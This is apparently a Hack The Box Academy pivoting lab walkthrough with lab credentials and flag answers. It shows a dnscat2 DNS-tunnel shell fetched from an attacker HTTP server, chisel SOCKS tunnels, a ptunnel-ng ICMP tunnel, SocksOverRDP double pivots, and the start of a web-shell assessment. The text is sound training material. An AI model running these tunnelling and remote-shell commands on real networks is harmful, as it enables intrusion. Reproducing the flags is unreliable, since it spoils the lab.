<p>RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-231-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-231-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-231-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-231-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-231-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-231-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-231-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-231-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-231-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-231-10">10</a></span>
<span class="normal"><a href="#__codelineno-231-11">11</a></span>
<span class="normal"><a href="#__codelineno-231-12">12</a></span>
<span class="normal"><a href="#__codelineno-231-13">13</a></span>
<span class="normal"><a href="#__codelineno-231-14">14</a></span>
<span class="normal"><a href="#__codelineno-231-15">15</a></span>
<span class="normal"><a href="#__codelineno-231-16">16</a></span>
<span class="normal"><a href="#__codelineno-231-17">17</a></span>
<span class="normal"><a href="#__codelineno-231-18">18</a></span>
<span class="normal"><a href="#__codelineno-231-19">19</a></span>
<span class="normal"><a href="#__codelineno-231-20">20</a></span>
<span class="normal"><a href="#__codelineno-231-21">21</a></span>
<span class="normal"><a href="#__codelineno-231-22">22</a></span>
<span class="normal"><a href="#__codelineno-231-23">23</a></span>
<span class="normal"><a href="#__codelineno-231-24">24</a></span>
<span class="normal"><a href="#__codelineno-231-25">25</a></span>
<span class="normal"><a href="#__codelineno-231-26">26</a></span>
<span class="normal"><a href="#__codelineno-231-27">27</a></span>
<span class="normal"><a href="#__codelineno-231-28">28</a></span>
<span class="normal"><a href="#__codelineno-231-29">29</a></span>
<span class="normal"><a href="#__codelineno-231-30">30</a></span>
<span class="normal"><a href="#__codelineno-231-31">31</a></span>
<span class="normal"><a href="#__codelineno-231-32">32</a></span>
<span class="normal"><a href="#__codelineno-231-33">33</a></span>
<span class="normal"><a href="#__codelineno-231-34">34</a></span>
<span class="normal"><a href="#__codelineno-231-35">35</a></span>
<span class="normal"><a href="#__codelineno-231-36">36</a></span>
<span class="normal"><a href="#__codelineno-231-37">37</a></span>
<span class="normal"><a href="#__codelineno-231-38">38</a></span>
<span class="normal"><a href="#__codelineno-231-39">39</a></span>
<span class="normal"><a href="#__codelineno-231-40">40</a></span>
<span class="normal"><a href="#__codelineno-231-41">41</a></span>
<span class="normal"><a href="#__codelineno-231-42">42</a></span>
<span class="normal"><a href="#__codelineno-231-43">43</a></span>
<span class="normal"><a href="#__codelineno-231-44">44</a></span>
<span class="normal"><a href="#__codelineno-231-45">45</a></span>
<span class="normal"><a href="#__codelineno-231-46">46</a></span>
<span class="normal"><a href="#__codelineno-231-47">47</a></span>
<span class="normal"><a href="#__codelineno-231-48">48</a></span>
<span class="normal"><a href="#__codelineno-231-49">49</a></span>
<span class="normal"><a href="#__codelineno-231-50">50</a></span>
<span class="normal"><a href="#__codelineno-231-51">51</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-231-1"><a id="__codelineno-231-1" name="__codelineno-231-1"></a># In the kali attacker machine with ip $ip:
</span><span id="__span-231-2"><a id="__codelineno-231-2" name="__codelineno-231-2"></a>##################################
</span><span id="__span-231-3"><a id="__codelineno-231-3" name="__codelineno-231-3"></a># Install the DNScat server
</span><span id="__span-231-4"><a id="__codelineno-231-4" name="__codelineno-231-4"></a>git clone https://github.com/iagox86/dnscat2.git
</span><span id="__span-231-5"><a id="__codelineno-231-5" name="__codelineno-231-5"></a>
</span><span id="__span-231-6"><a id="__codelineno-231-6" name="__codelineno-231-6"></a>cd dnscat2/server/
</span><span id="__span-231-7"><a id="__codelineno-231-7" name="__codelineno-231-7"></a>sudo gem install bundler
</span><span id="__span-231-8"><a id="__codelineno-231-8" name="__codelineno-231-8"></a>sudo bundle install
</span><span id="__span-231-9"><a id="__codelineno-231-9" name="__codelineno-231-9"></a>
</span><span id="__span-231-10"><a id="__codelineno-231-10" name="__codelineno-231-10"></a># Launch the server
</span><span id="__span-231-11"><a id="__codelineno-231-11" name="__codelineno-231-11"></a>sudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache
</span><span id="__span-231-12"><a id="__codelineno-231-12" name="__codelineno-231-12"></a>
</span><span id="__span-231-13"><a id="__codelineno-231-13" name="__codelineno-231-13"></a># See the response after launching the server. The dns server will generate a secret that we will use from the victim machine to connect
</span><span id="__span-231-14"><a id="__codelineno-231-14" name="__codelineno-231-14"></a>
</span><span id="__span-231-15"><a id="__codelineno-231-15" name="__codelineno-231-15"></a># Now, we need the client connection. As our targetted machine is Windows we download the powershell client dnscat2 to our kali
</span><span id="__span-231-16"><a id="__codelineno-231-16" name="__codelineno-231-16"></a>git clone https://github.com/lukebaggett/dnscat2-powershell.git
</span><span id="__span-231-17"><a id="__codelineno-231-17" name="__codelineno-231-17"></a>
</span><span id="__span-231-18"><a id="__codelineno-231-18" name="__codelineno-231-18"></a># Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques. In this case I initiated a http server from the folder where dnscat2.ps1 was
</span><span id="__span-231-19"><a id="__codelineno-231-19" name="__codelineno-231-19"></a>python -m http.server 8000
</span><span id="__span-231-20"><a id="__codelineno-231-20" name="__codelineno-231-20"></a>
</span><span id="__span-231-21"><a id="__codelineno-231-21" name="__codelineno-231-21"></a>
</span><span id="__span-231-22"><a id="__codelineno-231-22" name="__codelineno-231-22"></a># Additionally, I opened a RDP connection with the windows machine:
</span><span id="__span-231-23"><a id="__codelineno-231-23" name="__codelineno-231-23"></a>xfreerdp  /u:&quot;htb-student&quot; /p:&quot;HTB_@cademy_stdnt\!&quot; /v:$ip
</span><span id="__span-231-24"><a id="__codelineno-231-24" name="__codelineno-231-24"></a>
</span><span id="__span-231-25"><a id="__codelineno-231-25" name="__codelineno-231-25"></a>
</span><span id="__span-231-26"><a id="__codelineno-231-26" name="__codelineno-231-26"></a>###########################################
</span><span id="__span-231-27"><a id="__codelineno-231-27" name="__codelineno-231-27"></a>## From the windows machine. Open a powershell
</span><span id="__span-231-28"><a id="__codelineno-231-28" name="__codelineno-231-28"></a>################
</span><span id="__span-231-29"><a id="__codelineno-231-29" name="__codelineno-231-29"></a># Download the dnscat2 powershell client:
</span><span id="__span-231-30"><a id="__codelineno-231-30" name="__codelineno-231-30"></a>curl http://$ipAttackerMachine:8000/dnscat2.ps1 &gt; dnscat2.ps1
</span><span id="__span-231-31"><a id="__codelineno-231-31" name="__codelineno-231-31"></a>
</span><span id="__span-231-32"><a id="__codelineno-231-32" name="__codelineno-231-32"></a># Install
</span><span id="__span-231-33"><a id="__codelineno-231-33" name="__codelineno-231-33"></a>Import-Module .\dnscat2.ps1
</span><span id="__span-231-34"><a id="__codelineno-231-34" name="__codelineno-231-34"></a>
</span><span id="__span-231-35"><a id="__codelineno-231-35" name="__codelineno-231-35"></a># Initiate the connection
</span><span id="__span-231-36"><a id="__codelineno-231-36" name="__codelineno-231-36"></a>Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd 
</span><span id="__span-231-37"><a id="__codelineno-231-37" name="__codelineno-231-37"></a># $secret is obtained from the server launched in the kali machne.
</span><span id="__span-231-38"><a id="__codelineno-231-38" name="__codelineno-231-38"></a>
</span><span id="__span-231-39"><a id="__codelineno-231-39" name="__codelineno-231-39"></a>###########################################
</span><span id="__span-231-40"><a id="__codelineno-231-40" name="__codelineno-231-40"></a>## From the kali Attacker machine
</span><span id="__span-231-41"><a id="__codelineno-231-41" name="__codelineno-231-41"></a>################
</span><span id="__span-231-42"><a id="__codelineno-231-42" name="__codelineno-231-42"></a># We will receive the message:
</span><span id="__span-231-43"><a id="__codelineno-231-43" name="__codelineno-231-43"></a># New window created: 1
</span><span id="__span-231-44"><a id="__codelineno-231-44" name="__codelineno-231-44"></a># Session 1 Security: ENCRYPTED AND VERIFIED!
</span><span id="__span-231-45"><a id="__codelineno-231-45" name="__codelineno-231-45"></a>(the security depends on the strength of your pre-shared secret!)
</span><span id="__span-231-46"><a id="__codelineno-231-46" name="__codelineno-231-46"></a>
</span><span id="__span-231-47"><a id="__codelineno-231-47" name="__codelineno-231-47"></a># Enter the session
</span><span id="__span-231-48"><a id="__codelineno-231-48" name="__codelineno-231-48"></a>window -i 1
</span><span id="__span-231-49"><a id="__codelineno-231-49" name="__codelineno-231-49"></a>
</span><span id="__span-231-50"><a id="__codelineno-231-50" name="__codelineno-231-50"></a># Retrieve the flag
</span><span id="__span-231-51"><a id="__codelineno-231-51" name="__codelineno-231-51"></a>type C:\Users\htb-student\Documents\flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: AC@tinth3Tunnel</p>
<p>SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!" Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-232-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-232-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-232-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-232-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-232-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-232-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-232-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-232-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-232-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-232-10">10</a></span>
<span class="normal"><a href="#__codelineno-232-11">11</a></span>
<span class="normal"><a href="#__codelineno-232-12">12</a></span>
<span class="normal"><a href="#__codelineno-232-13">13</a></span>
<span class="normal"><a href="#__codelineno-232-14">14</a></span>
<span class="normal"><a href="#__codelineno-232-15">15</a></span>
<span class="normal"><a href="#__codelineno-232-16">16</a></span>
<span class="normal"><a href="#__codelineno-232-17">17</a></span>
<span class="normal"><a href="#__codelineno-232-18">18</a></span>
<span class="normal"><a href="#__codelineno-232-19">19</a></span>
<span class="normal"><a href="#__codelineno-232-20">20</a></span>
<span class="normal"><a href="#__codelineno-232-21">21</a></span>
<span class="normal"><a href="#__codelineno-232-22">22</a></span>
<span class="normal"><a href="#__codelineno-232-23">23</a></span>
<span class="normal"><a href="#__codelineno-232-24">24</a></span>
<span class="normal"><a href="#__codelineno-232-25">25</a></span>
<span class="normal"><a href="#__codelineno-232-26">26</a></span>
<span class="normal"><a href="#__codelineno-232-27">27</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-232-1"><a id="__codelineno-232-1" name="__codelineno-232-1"></a>#########
</span><span id="__span-232-2"><a id="__codelineno-232-2" name="__codelineno-232-2"></a># In the attacker machine
</span><span id="__span-232-3"><a id="__codelineno-232-3" name="__codelineno-232-3"></a>#######
</span><span id="__span-232-4"><a id="__codelineno-232-4" name="__codelineno-232-4"></a>git clone https://github.com/jpillora/chisel.git
</span><span id="__span-232-5"><a id="__codelineno-232-5" name="__codelineno-232-5"></a>
</span><span id="__span-232-6"><a id="__codelineno-232-6" name="__codelineno-232-6"></a>cd chisel
</span><span id="__span-232-7"><a id="__codelineno-232-7" name="__codelineno-232-7"></a>go build
</span><span id="__span-232-8"><a id="__codelineno-232-8" name="__codelineno-232-8"></a>
</span><span id="__span-232-9"><a id="__codelineno-232-9" name="__codelineno-232-9"></a>
</span><span id="__span-232-10"><a id="__codelineno-232-10" name="__codelineno-232-10"></a># It can be helpful to be mindful of the size of the files we transfer onto targets on our client&#39;s networks, not just for performance reasons but also considering detection.
</span><span id="__span-232-11"><a id="__codelineno-232-11" name="__codelineno-232-11"></a># You can run `go build -ldflags=&quot;-s -w&quot;` and reduce it to 7.5MB (where `-s` is “Omit all symbol information from the output file” or strip, and `-w` is “Omit the DWARF symbol table”).
</span><span id="__span-232-12"><a id="__codelineno-232-12" name="__codelineno-232-12"></a>go build -ldflags=&quot;-s -w&quot;
</span><span id="__span-232-13"><a id="__codelineno-232-13" name="__codelineno-232-13"></a>
</span><span id="__span-232-14"><a id="__codelineno-232-14" name="__codelineno-232-14"></a># Copy the file to the target
</span><span id="__span-232-15"><a id="__codelineno-232-15" name="__codelineno-232-15"></a>scp chisel ubuntu@$ip:~/
</span><span id="__span-232-16"><a id="__codelineno-232-16" name="__codelineno-232-16"></a>
</span><span id="__span-232-17"><a id="__codelineno-232-17" name="__codelineno-232-17"></a># And connect to the machine
</span><span id="__span-232-18"><a id="__codelineno-232-18" name="__codelineno-232-18"></a>ssh ubuntu@$ip
</span><span id="__span-232-19"><a id="__codelineno-232-19" name="__codelineno-232-19"></a>
</span><span id="__span-232-20"><a id="__codelineno-232-20" name="__codelineno-232-20"></a>
</span><span id="__span-232-21"><a id="__codelineno-232-21" name="__codelineno-232-21"></a>#########
</span><span id="__span-232-22"><a id="__codelineno-232-22" name="__codelineno-232-22"></a># In the Ubuntu compromised machine, our Pivot Host
</span><span id="__span-232-23"><a id="__codelineno-232-23" name="__codelineno-232-23"></a>#######
</span><span id="__span-232-24"><a id="__codelineno-232-24" name="__codelineno-232-24"></a>
</span><span id="__span-232-25"><a id="__codelineno-232-25" name="__codelineno-232-25"></a>./chisel server -v -p 1234 --socks5
</span><span id="__span-232-26"><a id="__codelineno-232-26" name="__codelineno-232-26"></a>
</span><span id="__span-232-27"><a id="__codelineno-232-27" name="__codelineno-232-27"></a>sudo ./chisel server --reverse -v -p 1234 --socks5
</span></code></pre></div></td></tr></table></div>
<p>SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
<strong>Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.</strong></p>
<p>Results: <code>Th3$eTunne1$@rent8oring!</code></p>
<p><strong>Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.</strong></p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-233-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-233-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-233-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-233-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-233-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-233-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-233-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-233-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-233-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-233-10">10</a></span>
<span class="normal"><a href="#__codelineno-233-11">11</a></span>
<span class="normal"><a href="#__codelineno-233-12">12</a></span>
<span class="normal"><a href="#__codelineno-233-13">13</a></span>
<span class="normal"><a href="#__codelineno-233-14">14</a></span>
<span class="normal"><a href="#__codelineno-233-15">15</a></span>
<span class="normal"><a href="#__codelineno-233-16">16</a></span>
<span class="normal"><a href="#__codelineno-233-17">17</a></span>
<span class="normal"><a href="#__codelineno-233-18">18</a></span>
<span class="normal"><a href="#__codelineno-233-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-233-1"><a id="__codelineno-233-1" name="__codelineno-233-1"></a><span class="gp">#</span><span class="c1">########</span>
</span><span id="__span-233-2"><a id="__codelineno-233-2" name="__codelineno-233-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
</span><span id="__span-233-3"><a id="__codelineno-233-3" name="__codelineno-233-3"></a><span class="gp">#</span><span class="c1">######</span>
</span><span id="__span-233-4"><a id="__codelineno-233-4" name="__codelineno-233-4"></a><span class="go">git clone https://github.com/utoni/ptunnel-ng.git</span>
</span><span id="__span-233-5"><a id="__codelineno-233-5" name="__codelineno-233-5"></a>
</span><span id="__span-233-6"><a id="__codelineno-233-6" name="__codelineno-233-6"></a><span class="gp"># </span>Once<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>repo<span class="w"> </span>is<span class="w"> </span>cloned<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host,<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>autogen.sh<span class="w"> </span>script<span class="w"> </span>located<span class="w"> </span>at<span class="w"> </span>the<span class="w"> </span>root<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>directory.<span class="w"> </span>Building<span class="w"> </span>Ptunnel-ng<span class="w"> </span>with<span class="w"> </span>Autogen.sh
</span><span id="__span-233-7"><a id="__codelineno-233-7" name="__codelineno-233-7"></a><span class="go">sudo ./autogen.sh </span>
</span><span id="__span-233-8"><a id="__codelineno-233-8" name="__codelineno-233-8"></a>
</span><span id="__span-233-9"><a id="__codelineno-233-9" name="__codelineno-233-9"></a><span class="gp"># </span>Another<span class="w"> </span>way<span class="w"> </span>to<span class="w"> </span>build<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>binary
</span><span id="__span-233-10"><a id="__codelineno-233-10" name="__codelineno-233-10"></a><span class="go">sudo apt install automake autoconf -y</span>
</span><span id="__span-233-11"><a id="__codelineno-233-11" name="__codelineno-233-11"></a><span class="go">cd ptunnel-ng/</span>
</span><span id="__span-233-12"><a id="__codelineno-233-12" name="__codelineno-233-12"></a><span class="go">sed -i &#39;$s/.*/LDFLAGS=-static &quot;${NEW_WD}\/configure&quot; --enable-static $@ \&amp;\&amp; make clean \&amp;\&amp; make -j${BUILDJOBS:-4} all/&#39; autogen.sh</span>
</span><span id="__span-233-13"><a id="__codelineno-233-13" name="__codelineno-233-13"></a><span class="go">./autogen.sh</span>
</span><span id="__span-233-14"><a id="__codelineno-233-14" name="__codelineno-233-14"></a>
</span><span id="__span-233-15"><a id="__codelineno-233-15" name="__codelineno-233-15"></a><span class="gp"># </span>After<span class="w"> </span>running<span class="w"> </span>autogen.sh,<span class="w"> </span>ptunnel-ng<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>client<span class="w"> </span>and<span class="w"> </span>server-side.<span class="w"> </span>We<span class="w"> </span>will<span class="w"> </span>now<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>transfer<span class="w"> </span>the<span class="w"> </span>repo<span class="w"> </span>from<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>host
</span><span id="__span-233-16"><a id="__codelineno-233-16" name="__codelineno-233-16"></a><span class="go">scp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/</span>
</span><span id="__span-233-17"><a id="__codelineno-233-17" name="__codelineno-233-17"></a>
</span><span id="__span-233-18"><a id="__codelineno-233-18" name="__codelineno-233-18"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>ubuntu
</span><span id="__span-233-19"><a id="__codelineno-233-19" name="__codelineno-233-19"></a><span class="go">ssh ubuntu@$ipUbuntuCompromisedMachine</span>
</span></code></pre></div></td></tr></table></div>
<p><strong>2.</strong> Start the ptunnel-ng Server on the Target Host</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-234-1">1</a></span>
<span class="normal"><a href="#__codelineno-234-2">2</a></span>
<span class="normal"><a href="#__codelineno-234-3">3</a></span>
<span class="normal"><a href="#__codelineno-234-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-234-1"><a id="__codelineno-234-1" name="__codelineno-234-1"></a><span class="gp">#</span><span class="c1">########</span>
</span><span id="__span-234-2"><a id="__codelineno-234-2" name="__codelineno-234-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine,<span class="w"> </span>our<span class="w"> </span>Pivot<span class="w"> </span>Host
</span><span id="__span-234-3"><a id="__codelineno-234-3" name="__codelineno-234-3"></a><span class="gp">#</span><span class="c1">######</span>
</span><span id="__span-234-4"><a id="__codelineno-234-4" name="__codelineno-234-4"></a><span class="go">sudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22</span>
</span></code></pre></div></td></tr></table></div>
<p><strong>3.</strong> With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-235-1">1</a></span>
<span class="normal"><a href="#__codelineno-235-2">2</a></span>
<span class="normal"><a href="#__codelineno-235-3">3</a></span>
<span class="normal"><a href="#__codelineno-235-4">4</a></span>
<span class="normal"><a href="#__codelineno-235-5">5</a></span>
<span class="normal"><a href="#__codelineno-235-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-235-1"><a id="__codelineno-235-1" name="__codelineno-235-1"></a><span class="gp">#</span><span class="c1">########</span>
</span><span id="__span-235-2"><a id="__codelineno-235-2" name="__codelineno-235-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
</span><span id="__span-235-3"><a id="__codelineno-235-3" name="__codelineno-235-3"></a><span class="gp">#</span><span class="c1">######</span>
</span><span id="__span-235-4"><a id="__codelineno-235-4" name="__codelineno-235-4"></a>
</span><span id="__span-235-5"><a id="__codelineno-235-5" name="__codelineno-235-5"></a><span class="gp"># </span>Connecting<span class="w"> </span>to<span class="w"> </span>ptunnel-ng<span class="w"> </span>Server<span class="w"> </span>from<span class="w"> </span>Attack<span class="w"> </span>Host
</span><span id="__span-235-6"><a id="__codelineno-235-6" name="__codelineno-235-6"></a><span class="go">sudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22</span>
</span></code></pre></div></td></tr></table></div>
<p>Now we can use proxychains with RDP to connect to the machine in the other network range:</p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-236-1">1</a></span>
<span class="normal"><a href="#__codelineno-236-2">2</a></span>
<span class="normal"><a href="#__codelineno-236-3">3</a></span>
<span class="normal"><a href="#__codelineno-236-4">4</a></span>
<span class="normal"><a href="#__codelineno-236-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-236-1"><a id="__codelineno-236-1" name="__codelineno-236-1"></a><span class="gp"># </span>First,<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>Dynamic<span class="w"> </span>Port<span class="w"> </span>Forwarding<span class="w"> </span>over<span class="w"> </span>SSH
</span><span id="__span-236-2"><a id="__codelineno-236-2" name="__codelineno-236-2"></a><span class="go">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span>
</span><span id="__span-236-3"><a id="__codelineno-236-3" name="__codelineno-236-3"></a>
</span><span id="__span-236-4"><a id="__codelineno-236-4" name="__codelineno-236-4"></a><span class="gp"># </span>Now<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>use<span class="w"> </span>proxychains<span class="w"> </span>with<span class="w"> </span>nmap
</span><span id="__span-236-5"><a id="__codelineno-236-5" name="__codelineno-236-5"></a><span class="go">proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: N3Tw0rkTunnelV1sion!</p>
<h3 id="double-pivots">Double Pivots</h3>
<p>RDP to $ip with user "htb-student" and password "HTB_@cademy_stdnt!"
<strong>Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.</strong></p>
<p>Our goal will be reaching the attacked machine 3. </p>
<p><strong>1.</strong> First, we download appropriate binaries to our kali attack host:</p>
<ul>
<li><a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a></li>
<li><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></li>
</ul>
<p><strong>2.</strong>  Attacking machine 1</p>
<p>Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.</p>
<p>From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. <strong>Do it as Admin</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-237-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-237-1"><a id="__codelineno-237-1" name="__codelineno-237-1"></a>regsvr32.exe SocksOverRDP-Plugin.dll
</span></code></pre></div></td></tr></table></div>
<p><strong>3.</strong> Attacking machine 2</p>
<p>Now, from the machine 1, we can connect to machine 2  over RDP using <code>mstsc.exe</code>. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.</p>
<p><strong>4.</strong> Attacking machine 3</p>
<p>Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.</p>
<p>When done, <strong>start SocksOverRDP-Server.exe with Admin privileges</strong> in machine 2.</p>
<p>When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-238-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-238-1"><a id="__codelineno-238-1" name="__codelineno-238-1"></a>netstat -antb | findstr 1080
</span></code></pre></div></td></tr></table></div>
<p>Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-239-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-239-1"><a id="__codelineno-239-1" name="__codelineno-239-1"></a>Open proxifier and go to Profile &gt; Proxy server. Click on &quot;Add...&quot;
</span></code></pre></div></td></tr></table></div>
<p>With Proxifier configured and running, we can <strong>start mstsc.exe</strong>, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.</p>
<p>So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.</p>
<p>Results: H0pping@roundwithRDP!</p>
<h3 id="skill-assessments">Skill assessments</h3>
<p>A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a <code>web shell</code> in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are <code>below</code>:</p>
<p><strong>Objectives</strong></p>
<ul>
<li>Start from external (<code>Pwnbox or your own VM</code>) and access the first system via the web shell left in place.</li>
<li>Use the web shell access to enumerate and pivot to an internal host.</li>
<li>Continue enumeration and pivoting until you reach the <code>Inlanefreight Domain Controller</code> and capture the associated <code>flag</code>.</li>
<li>Use any <code>data</code>, <code>credentials</code>, <code>scripts</code>, or other information within the environment to enable your pivoting attempts.</li>
<li>Grab <code>any/all</code> flags that can be found.</li>
</ul>
<p><strong>Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-240-1">1</a></span>
<span class="normal"><a href="#__codelineno-240-2">2</a></span>
<span class="normal"><a href="#__codelineno-240-3">3</a></span>
<span class="normal"><a href="#__codelineno-240-4">4</a></span>
<span class="normal"><a href="#__codelineno-240-5">5</a></span>
<span class="normal"><a href="#__codelineno-240-6">6</a></span>
<span class="normal"><a href="#__codelineno-240-7">7</a></span>
<span class="normal"><a href="#__codelineno-240-8">8</a></span>
<span class="normal"><a href="#__codelineno-240-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-240-1"><a id="__codelineno-240-1" name="__codelineno-240-1"></a># Enumerate $ip
</span><span id="__span-240-2"><a id="__codelineno-240-2" name="__codelineno-240-2"></a>sudo nmap $ip
</span><span id="__span-240-3"><a id="__codelineno-240-3" name="__codelineno-240-3"></a># It will return port 80 and 22. Open a browser and go to http://$ip. It&#39;s a reverse shell. 
</span><span id="__span-240-4"><a id="__codelineno-240-4" name="__codelineno-240-4"></a>cd /home
